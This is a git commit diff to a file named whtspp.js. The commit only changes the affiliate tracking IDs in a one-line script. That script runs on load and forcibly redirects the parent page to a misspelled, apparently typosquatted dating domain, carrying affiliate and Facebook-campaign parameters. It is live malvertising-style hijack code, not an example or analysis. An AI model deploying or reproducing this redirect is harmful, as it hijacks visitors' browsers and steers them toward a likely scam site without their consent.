05241778c0940e9f66f01c80638ca0d59ed00a12
Zen Arkana R <zenarkanarahman@gmail.com>
2026-08-31 09:31:28 +0700

    Update whtspp.js

--- whtspp.js
+++ whtspp.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://argbq.datiingshop.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=2282541&s5=Whts&click_id=Whts"; } LoadAd();
+function LoadAd() { parent.location.href="https://argbq.datiingshop.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=1422095&s5=Zoux&click_id=Zoux"; } LoadAd();
